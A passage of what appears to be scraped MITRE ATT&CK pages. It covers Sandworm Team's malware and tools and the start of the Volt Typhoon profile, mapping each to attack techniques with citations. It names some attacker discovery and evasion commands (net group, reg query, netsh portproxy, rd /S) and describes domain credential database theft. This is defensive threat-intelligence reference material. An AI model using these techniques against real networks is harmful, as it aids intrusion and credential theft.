Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0401 Exaramel for Linux [49][34] Abuse Elevation Control Mechanism: Setuid and Setgid, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Unix Shell, Create or Modify System Process, Create or Modify System Process: Systemd Service, Deobfuscate/Decode Files or Information, Fallback Channels, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Scheduled Task/Job: Cron, System Owner/User Discovery S0343 Exaramel for Windows [49] Archive Collected Data, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Staged: Local Data Staging, Masquerading: Masquerade Task or Service, Modify Registry, Obfuscated Files or Information: Fileless Storage S0342 GreyEnergy [9] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping: LSASS Memory, Process Injection: Portable Executable Injection, Proxy: Multi-hop Proxy, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Service Discovery S0357 Impacket [11] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0604 Industroyer [18][29][17][50][14] Activate Firmware Update Mode, Application Layer Protocol: Web Protocols, Automated Collection, Block Command Message, Block Reporting Message, Block Serial COM, Brute Force I/O, Command-Line Interface, Compromise Host Software Binary, Connection Proxy, Create or Modify System Process: Windows Service, Data Destruction, Data Destruction, Denial of Control, Denial of Service, Denial of View, Deobfuscate/Decode Files or Information, Device Restart/Shutdown, Endpoint Denial of Service: Application or System Exploitation, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Loss of Control, Loss of Protection, Loss of View, Manipulation of Control, Manipulation of View, Monitor Process State, Network Connection Enumeration, Network Service Discovery, Obfuscated Files or Information, Protocol Tunneling, Proxy: Multi-hop Proxy, Query Registry, Remote System Discovery, Remote System Discovery, Remote System Information Discovery, Service Stop, Service Stop, System Information Discovery, System Network Configuration Discovery, Unauthorized Command Message, Valid Accounts S1072 Industroyer2 [51][14] Automated Collection, Brute Force I/O, Modify Parameter, Monitor Process State, Process Discovery, Remote System Information Discovery, Service Stop, Unauthorized Command Message S0231 Invoke-PSImage [1] Obfuscated Files or Information: Steganography, Obfuscated Files or Information: Embedded Payloads S1190 Kapeka Kapeka is associated with Sandworm Team operations and previous malware variants such as GreyEnergy.[52][53] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Indicator Removal: Clear Persistence, Masquerading: Masquerade File Type, Modify Registry, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Proxy, Query Registry, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Rundll32, System Information Discovery S0607 KillDisk [1][9] Access Token Manipulation, Data Destruction, Data Destruction, Data Encrypted for Impact, Disk Wipe: Disk Structure Wipe, File and Directory Discovery, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Indicator Removal on Host, Loss of View, Masquerading: Masquerade Task or Service, Native API, Obfuscated Files or Information, Process Discovery, Service Stop, Service Stop, Shared Modules, System Information Discovery, System Shutdown/Reboot S0002 Mimikatz [18] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S1189 Neo-reGeorg [20] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Python, Data Encoding: Non-Standard Encoding, Ingress Tool Transfer, Non-Application Layer Protocol, Protocol Tunneling, Proxy, Server Software Component: Web Shell S0039 Net [18] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0368 NotPetya [6][1][2][9][48][14] Data Encrypted for Impact, Exploitation of Remote Services, Exploitation of Remote Services, File and Directory Discovery, Indicator Removal: Clear Windows Event Logs, Lateral Tool Transfer, Loss of Productivity and Revenue, Masquerading, OS Credential Dumping: LSASS Memory, Remote Services: SMB/Windows Admin Shares, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Services: Service Execution, System Shutdown/Reboot, Valid Accounts: Local Accounts, Windows Management Instrumentation S0365 Olympic Destroyer [54][9][1][2][48][14] Credentials from Password Stores: Credentials from Web Browsers, Data Destruction, Indicator Removal: Clear Windows Event Logs, Inhibit System Recovery, Lateral Tool Transfer, Network Share Discovery, OS Credential Dumping: LSASS Memory, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, Service Stop, System Network Configuration Discovery, System Services: Service Execution, System Shutdown/Reboot, Windows Management Instrumentation S0598 P.A.S. Webshell [34] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter, Data from Information Repositories, Data from Local System, Deobfuscate/Decode Files or Information, File and Directory Discovery, File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, Indicator Removal: File Deletion, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information, Server Software Component: Web Shell, Software Discovery S0378 PoshC2 Sandworm Team has used multiple publicly available tools during operations, such as PoshC2.[14] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Create Process with Token, Access Token Manipulation, Account Discovery: Local Account, Account Discovery: Domain Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Automated Collection, Brute Force, Credentials from Password Stores, Domain Trust Discovery, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Input Capture: Keylogging, Network Service Discovery, Network Sniffing, OS Credential Dumping: LSASS Memory, Password Policy Discovery, Permission Groups Discovery: Local Groups, Process Injection, Proxy, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Unsecured Credentials: Credentials In Files, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S1058 Prestige [11][14] Command and Scripting Interpreter: PowerShell, Data Encrypted for Impact, Domain or Tenant Policy Modification: Group Policy Modification, File and Directory Discovery, Inhibit System Recovery, Modify Registry, Native API, Scheduled Task/Job: Scheduled Task, Service Stop S0029 PsExec [18] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0195 SDelete Sandworm Team has used SDelete for wartime operations in 2022-2023.[14] Data Destruction, Indicator Removal: File Deletion S1010 VPNFilter VPNFilter is associated with Sandworm Team operations based on reporting on VPNFilter replacement software, Cyclops Blink.[47] Adversary-in-the-Middle, Disk Wipe: Disk Content Wipe, Network Sniffing References Scott W. Brady. (2020, October 15). United States vs. Yuriy Sergeyevich Andrienko et al.. Retrieved November 25, 2020. UK NCSC. (2020, October 19). UK exposes series of Russian cyber attacks against Olympic and Paralympic Games . Retrieved November 30, 2020. Hultquist, J.. (2016, January 7). Sandworm Team and the Ukrainian Power Authority Attacks. Retrieved October 6, 2017. Meyers, A. (2018, January 19). Meet CrowdStrike\u2019s Adversary of the Month for January: VOODOO BEAR. Retrieved May 22, 2018. Pompeo, M. (2020, February 20). The United States Condemns Russian Cyber Attack Against the Country of Georgia. Retrieved September 12, 2024. NCSC. (2020, February 20). NCSC supports US advisory regarding GRU intrusion set Sandworm. Retrieved June 10, 2020. Brady, S . (2018, October 3). Indictment - United States vs Aleksei Sergeyevich Morenets, et al.. Retrieved October 1, 2020. Dragos. (2017, January 1). ELECTRUM Threat Profile. Retrieved June 10, 2020. Secureworks. (2020, May 1). IRON VIKING Threat Profile. Retrieved June 10, 2020. F-Secure Labs. (2014). BlackEnergy & Quedagh: The convergence of crimeware and APT attacks. Retrieved March 24, 2016. MSTIC. (2022, October 14). New \u201cPrestige\u201d ransomware impacts organizations in Ukraine and Poland. Retrieved January 19, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Billy Leonard. (2023, April 19). Ukraine remains Russia\u2019s biggest cyber focus in 2023. Retrieved March 1, 2024. Roncone, G. et al. (n.d.). APT44: Unearthing Sandworm. Retrieved July 11, 2024. Booz Allen Hamilton. (2016). When The Lights Went Out. Retrieved December 18, 2024. Andy Greenberg. (2017, June 28). How an Entire Nation Became Russia's Test Lab for Cyberwar. Retrieved September 27, 2023. Anton Cherepanov. (2017, June 12). Win32/Industroyer: A new threat for industrial controls systems. Retrieved December 18, 2020. Joe Slowik. (2018, October 12). Anatomy of an Attack: Detecting and Defeating CRASHOVERRIDE. Retrieved December 18, 2020. Joe Slowik 2019, August 15 CRASHOVERRIDE: Reassessing the 2016 Ukraine Electric Power Event as a Protection-Focused Attack Retrieved. 2019/10/22 Ken Proska, John Wolfram, Jared Wilson, Dan Black, Keith Lunden, Daniel Kapellmann Zafra, Nathan Brubaker, Tyler Mclellan, Chris Sistrunk. (2023, November 9). Sandworm Disrupts Power in Ukraine Using a Novel Attack Against Operational Technology. Retrieved March 28, 2024. Dragos, Inc.. (2023, December 11). ELECTRUM Targeted Ukrainian Electric Entity Using Custom Tools and CaddyWiper Malware, October 2022. Retrieved March 28, 2024. Cherepanov, A.. (2016, December 13). The rise of TeleBots: Analyzing disruptive KillDisk attacks. Retrieved June 10, 2020. Cherepanov, A.. (2017, July 4). Analysis of TeleBots\u2019 cunning backdoor . Retrieved June 11, 2020. Joseph Slowik, DomainTools. (2021, March 3). Centreon to Exim and Back: On the Trail of Sandworm. Retrieved April 6, 2024. Cherepanov, A.. (2016, January 3). BlackEnergy by the SSHBearDoor: attacks against Ukrainian news media and electric industry . Retrieved June 10, 2020. Cherepanov, A.. (2017, June 30). TeleBots are back: Supply chain attacks against Ukraine. Retrieved June 11, 2020. National Security Agency. (2020, March 28). Sandworm Actors Exploiting Vulnerability In EXIM Mail Transfer Agent. Retrieved March 1, 2024. NCSC. (2022, February 23). Cyclops Blink Malware Analysis Report. Retrieved March 3, 2022. Dragos Inc.. (2017, June 13). CRASHOVERRIDE Analysis of the Threat to Electric Grid Operations. Retrieved December 18, 2020. US-CERT. (2016, February 25). ICS Alert (IR-ALERT-H-16-056-01) Cyber-Attack Against Ukrainian Critical Infrastructure. Retrieved June 10, 2020. Ward, S.. (2014, October 14). iSIGHT discovers zero-day vulnerability CVE-2014-4114 used in Russian cyber-espionage campaign. Retrieved November 17, 2024. Wu, W. (2014, October 14). An Analysis of Windows Zero-day Vulnerability \u2018CVE-2014-4114\u2019 aka \u201cSandworm\u201d. Retrieved June 18, 2020. Li, H. (2013, November 5). McAfee Labs Detects Zero-Day Exploit Targeting Microsoft Office. Retrieved June 18, 2020. ANSSI. (2021, January 27). SANDWORM INTRUSION SET CAMPAIGN TARGETING CENTREON SYSTEMS. Retrieved March 30, 2021. Electricity Information Sharing and Analysis Center; SANS Industrial Control Systems. (2016, March 18). Analysis of the Cyber Attack on the Ukranian Power Grid: Defense Use Case. Retrieved March 27, 2018. Charles McLellan. (2016, March 4). How hackers attacked Ukraine's power grid: Implications for Industrial IoT security. Retrieved September 27, 2023. Morgan, K. (2023, October 18). Government-backed actors exploiting WinRAR vulnerability. Retrieved July 19, 2024. Counter Threat Research Team. (2017, June 28). NotPetya Campaign: What We Know About the Latest Global Ransomware Attack. Retrieved June 11, 2020. Dragos 2018, October 12 Anatomy of an Attack: Detecting and Defeating CRASHOVERRIDE Retrieved. 2019/10/14 Dragos Inc. 2017, June 13 Industroyer - Dragos - 201706: Analysis of the Threat to Electic Grid Operations Retrieved. 2017/09/18 ICS-CERT 2014, December 10 ICS Alert (ICS-ALERT-14-281-01E) Ongoing Sophisticated Malware Campaign Compromising ICS (Update E) Retrieved. 2019/10/11 ICS CERT 2018, September 06 Advantech/Broadwin WebAccess RPC Vulnerability (Update B) Retrieved. 2019/12/05 Juan Andr\u00e9s Guerrero-Saade & Tom Hegel. (2024, March 21). AcidPour | New Embedded Wiper Variant of AcidRain Appears in Ukraine. Retrieved November 25, 2024. A.J. Vincens, CyberScoop. (2024, March 18). Researchers spot updated version of malware that hit Viasat. Retrieved March 25, 2024. Juan Andres Guerrero-Saade and Max van Amerongen, SentinelOne. (2022, March 31). AcidRain | A Modem Wiper Rains Down on Europe. Retrieved March 25, 2024. B. Leonard, N. Mehta. (2019, November 21). The Secret Life of Sandworms. Retrieved December 31, 2020. NCSC, CISA, FBI, NSA. (2022, February 23). New Sandworm malware Cyclops Blink replaces VPNFilter. Retrieved March 3, 2022. Haquebord, F. et al. (2022, March 17). Cyclops Blink Sets Sights on Asus Routers. Retrieved March 17, 2022. Cherepanov, A., Lipovsky, R. (2018, October 11). New TeleBots backdoor: First evidence linking Industroyer to NotPetya. Retrieved November 27, 2018. Secureworks. (2020, May 1). IRON VIKING Threat Profile. Retrieved June 10, 2020. ESET. (2022, April 12). Industroyer2: Industroyer reloaded. Retrieved March 30, 2023. Microsoft. (2024, February 14). Backdoor:Win64/KnuckleTouch.A!dha. Retrieved January 6, 2025. Mohammad Kazem Hassan Nejad, WithSecure. (2024, April 17). KAPEKA A novel backdoor spotted in Eastern Europe. Retrieved January 6, 2025. CrowdStrike. (2019, January). 2019 Global Threat Report. Retrieved June 10, 2020. "
},
{
"id": 85,
"title": "Volt Typhoon, BRONZE SILHOUETTE, Vanguard Panda, DEV-0391, UNC3236, Voltzite, Insidious Taurus, Group G1017",
"path": "/groups/G1017/index.html",
"content": " Volt Typhoon Volt Typhoon is a People's Republic of China (PRC) state-sponsored actor that has been active since at least 2021 primarily targeting critical infrastructure organizations in the US and its territories including Guam. Volt Typhoon's targeting and pattern of behavior have been assessed as pre-positioning to enable lateral movement to operational technology (OT) assets for potential destructive or disruptive attacks. Volt Typhoon has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands on keyboard activities, and stolen credentials.[1][2][3][4] ID: G1017 \u24d8 Associated Groups: BRONZE SILHOUETTE, Vanguard Panda, DEV-0391, UNC3236, Voltzite, Insidious Taurus Contributors: Phyo Paing Htun (ChiLai), I-Secure Co.,Ltd; Ai Kimura, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 2.0 Created: 27 July 2023 Last Modified: 21 May 2024 Version Permalink Live Version Associated Group Descriptions Name Description BRONZE SILHOUETTE [4][1] Vanguard Panda [1] DEV-0391 [1] UNC3236 [1] Voltzite [1] Insidious Taurus [1] Campaigns ID Name First Seen Last Seen References Techniques C0035 KV Botnet Activity October 2022 [5] January 2024 [6] Volt Typhoon used KV Botnet Activity to build intermediate communication chains between operators and victims, such as identified access to victims in Guam.[5] Acquire Infrastructure: Virtual Private Server, Command and Scripting Interpreter: Unix Shell, Compromise Infrastructure: Network Devices, Encrypted Channel, Event Triggered Execution, File and Directory Discovery, File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, Hide Artifacts: Bind Mounts, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Masquerading, Non-Application Layer Protocol, Non-Standard Port, Process Discovery, Process Injection: Proc Memory, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery C0039 Versa Director Zero Day Exploitation June 2024 [7] August 2024 [7] Versa Director Zero Day Exploitation was conducted by Volt Typhoon between June and August 2024.[7] Application Layer Protocol: Web Protocols, Compromise Infrastructure: Network Devices, Develop Capabilities: Malware, Encrypted Channel: Asymmetric Cryptography, Exploit Public-Facing Application, Input Capture, Non-Application Layer Protocol, Server Software Component: Web Shell Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account Volt Typhoon has executed net user and quser to enumerate local account information.[1] .002 Account Discovery: Domain Account Volt Typhoon has run net group /dom and net group \"Domain Admins\" /dom in compromised environments for account discovery.[3][4] Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server KV Botnet Activity used acquired Virtual Private Servers as control systems for devices infected with KV Botnet malware.[5] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Versa Director Zero Day Exploitation established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers.[7] Enterprise T1010 Application Window Discovery Volt Typhoon has collected window title information from compromised systems.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Volt Typhoon has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip.[4][1] Enterprise T1217 Browser Information Discovery Volt Typhoon has targeted the browsing history of network administrators.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Volt Typhoon has used PowerShell including for remote system discovery.[2][3][1] .003 Command and Scripting Interpreter: Windows Command Shell Volt Typhoon has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery.[2][3][4][1] .004 Command and Scripting Interpreter: Unix Shell Volt Typhoon has used Brightmetricagent.exe which contains a command- line interface (CLI) library that can leverage command shells including Z Shell (zsh).[1] KV Botnet Activity utilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell.[5] Enterprise T1584 .003 Compromise Infrastructure: Virtual Private Server Volt Typhoon has compromised Virtual Private Servers (VPS) to proxy C2 traffic.[1] .004 Compromise Infrastructure: Server Volt Typhoon has used compromised Paessler Router Traffic Grapher (PRTG) servers from other organizations for C2.[4][1] .005 Compromise Infrastructure: Botnet Volt Typhoon Volt Typhoon has used compromised Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support operations.[1] .008 Compromise Infrastructure: Network Devices Volt Typhoon has compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic.[2][3] Versa Director Zero Day Exploitation used compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers.[7] KV Botnet Activity focuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet.[5] Enterprise T1555 Credentials from Password Stores Volt Typhoon has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY.[3] .003 Credentials from Web Browsers Volt Typhoon has targeted network administrator browser data including browsing history and stored credentials.[1] Enterprise T1005 Data from Local System Volt Typhoon has stolen files from a sensitive file server and the Active Directory database from targeted environments, and used Wevtutil to extract event log information.[3][4][1] Enterprise T1074 Data Staged Volt Typhoon has staged collected data in password-protected archives.[2] .001 Local Data Staging Volt Typhoon has saved stolen files including the ntds.dit database and the SYSTEM and SECURITY Registry hives locally to the C:\\Windows\\Temp\\ directory.[3][4] Enterprise T1587 .001 Develop Capabilities: Malware Versa Director Zero Day Exploitation involved the development of a new web shell variant, VersaMem.[7] .004 Develop Capabilities: Exploits Volt Typhoon has exploited zero-day vulnerabilities for initial access.[1] Enterprise T1006 Direct Volume Access Volt Typhoon has executed the Windows-native vssadmin command to create volume shadow copies.[1] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography Volt Typhoon has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications.[4] .002 Encrypted Channel: Asymmetric Cryptography Versa Director Zero Day Exploitation used HTTPS for command and control of compromised Versa Director servers.[7] Enterprise T1546 Event Triggered Execution KV Botnet Activity involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox, wget, curl, tftp, telnetd, or lua. If the bioset string is not found, the related process is terminated.[5] Enterprise T1190 Exploit Public-Facing Application Volt Typhoon has gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.[4][1] Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution.[7] Enterprise T1068 Exploitation for Privilege Escalation Volt Typhoon has gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services.[1] Enterprise T1133 External Remote Services Volt Typhoon has used VPNs to connect to victim environments and enable post-exploitation actions.[1] Enterprise T1083 File and Directory Discovery Volt Typhoon has enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings.[1] KV Botnet Activity gathers a list of filenames from the following locations during execution of the final botnet stage: \\/usr\\/sbin\\/, \\/usr\\/bin\\/, \\/sbin\\/, \\/pfrm2.0\\/bin\\/, \\/usr\\/local\\/bin\\/.[5] Enterprise T1222 .002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification KV Botnet Activity altered permissions on downloaded tools and payloads to enable execution on victim machines.[5] Enterprise T1592 Gather Victim Host Information Volt Typhoon has conducted pre-compromise reconnaissance for victim host information.[1] Enterprise T1589 Gather Victim Identity Information Volt Typhoon has gathered victim identify information during pre-compromise reconnaissance. [1] .002 Email Addresses Volt Typhoon has targeted the personal emails of key network and IT staff at victim organizations.[1] Enterprise T1590 Gather Victim Network Information Volt Typhoon has conducted extensive pre-compromise reconnaissance to learn about the target organization\u2019s network.[1] .004 Network Topology Volt Typhoon has conducted extensive reconnaissance of victim networks including identifying network topologies.[1] .006 Network Security Appliances Volt Typhoon has identified target network security measures as part of pre-compromise reconnaissance.[1] Enterprise T1591 Gather Victim Org Information Volt Typhoon has conducted extensive reconnaissance pre-compromise to gain information about the targeted organization.[1] .004 Identify Roles Volt Typhoon has identified key network and IT staff members pre-compromise at targeted organizations.[1] Enterprise T1564 .013 Hide Artifacts: Bind Mounts KV Botnet Activity leveraged a bind mount to bind itself to the /proc/ file path before deleting its files from the /tmp/ directory.[5] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools KV Botnet Activity used various scripts to remove or disable security tools, such as http_watchdog and firewallsd, as well as tools related to other botnet infections, such as mips_ff, on victim devices.[5] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of intrusion activity.[1] .004 Indicator Removal: File Deletion Volt Typhoon has run rd /S to delete their working directories and deleted systeminfo.dat from C:\\Users\\Public\\Documentsfiles.[4][1] [KV Botnet Activity](https://attack.mitre.org/campaigns/C0035) removes on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device.[5] .007 Indicator Removal: Clear Network Connection History and Configurations Volt Typhoon has inspected server logs to remove their IPs.[4] Enterprise T1105 Ingress Tool Transfer Volt Typhoon has downloaded an outdated version of comsvcs.dll to a compromised domain controller in a non-standard folder.[1] KV Botnet Activity included the use of scripts to download additional payloads when compromising network nodes.[5] Enterprise T1056 .001 Input Capture: Keylogging Volt Typhoon has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution.[1] Enterprise T1570 Lateral Tool Transfer Volt Typhoon has copied web shells between servers in targeted environments.[4] Enterprise T1654 Log Enumeration Volt Typhoon has used wevtutil.exe and the PowerShell command Get-EventLog security to enumerate Windows logs to search for successful logons.[3][1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service KV Botnet Activity installation steps include first identifying, then stopping, any process containing [kworker\\/0:1], then renaming its initial installation stage to this process name.[5] .005 Masquerading: Match Legitimate Resource Name or Location Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.[3][4][1] .008 Masquerading: Masquerade File Type Volt Typhoon has appended copies of the ntds.dit database with a .gif file extension.[4] Enterprise T1112 Modify Registry Volt Typhoon has used netsh to create a PortProxy Registry modification on a compromised server running the Paessler Router Traffic Grapher (PRTG).[1] Enterprise T1046 Network Service Discovery Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for network service discovery.[1] Enterprise T1095 Non-Application Layer Protocol Versa Director Zero Day Exploitation used a non-standard TCP session to initialize communication prior to establishing HTTPS command and control.[7] KV Botnet Activity command and control traffic uses a non-standard, likely custom protocol for communication.[5] Enterprise T1571 Non-Standard Port KV Botnet Activity generates a random port number greater than 30,000 to serve as the listener for subsequent command and control activity.[5] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing Volt Typhoon has used the Ultimate Packer for Executables (UPX) to obfuscate the FRP client files BrightmetricAgent.exe and SMSvcService.ex) and the port scanning utility ScanLine.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Volt Typhoon has used legitimate network and forensic tools and customized versions of open-source tools for C2.[2][1] .006 Obtain Capabilities: Vulnerabilities Volt Typhoon has used publicly available exploit code for initial access.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Volt Typhoon has attempted to access hashed credentials from the LSASS process memory space.[2][1] .003 OS Credential Dumping: NTDS Volt Typhoon has used ntds.util to create domain controller installation media containing usernames and password hashes.[2][3][4][1] Enterprise T1120 Peripheral Device Discovery Volt Typhoon has obtained victim's screen dimension and display device information.[1] Enterprise T1069 Permission Groups Discovery Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for group and user discovery.[1] .001 Local Groups Volt Typhoon has run net localgroup administrators in compromised environments to enumerate accounts.[3] .002 Domain Groups Volt Typhoon has run net group in compromised environments to discover domain groups.[4] Enterprise T1057 Process Discovery Volt Typhoon has enumerated running processes on targeted systems including through the use of Tasklist.[2][4][1] Scripts associated with KV Botnet Activity initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation.[5] Enterprise T1055 .009 Process Injection: Proc Memory KV Botnet Activity final payload installation includes mounting and binding to the \\/proc\\/ filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts.[5] Enterprise T1090 Proxy Volt Typhoon has used compromised devices and customized versions of open source tools such as FRP (Fast Reverse Proxy), Earthworm, and Impacket to proxy network traffic.[2][3][1] .001 Internal Proxy Volt Typhoon has used the built-in netsh port proxy command to create proxies on compromised systems to facilitate access.[2][1] .003 Multi-hop Proxy Volt Typhoon has used multi-hop proxies for command-and-control infrastructure.[1] Enterprise T1012 Query Registry Volt Typhoon has queried the Registry on compromised systems, reg query hklm\\software\\, for information on installed software including PuTTY.[3][1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Volt Typhoon has moved laterally to the Domain Controller via RDP using a compromised account with domain administrator privileges.[1] Enterprise T1018 Remote System Discovery Volt Typhoon has used multiple methods, including Ping, to enumerate systems on compromised networks.[2][4] Enterprise T1113 Screen Capture Volt Typhoon has obtained a screenshot of the victim's system using the gdi32.dll and gdiplus.dll libraries.[1] Enterprise T1596 .005 Search Open Technical Databases: Scan Databases Volt Typhoon has used FOFA, Shodan, and Censys to search for exposed victim infrastructure.[1] Enterprise T1593 Search Open Websites/Domains Volt Typhoon has conducted pre-compromise web searches for victim information.[1] Enterprise T1594 Search Victim-Owned Websites Volt Typhoon has conducted pre-compromise reconnaissance on victim-owned sites.[1] Enterprise T1505 .003 Server Software Component: Web Shell Volt Typhoon has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.[4] Versa Director Zero Day 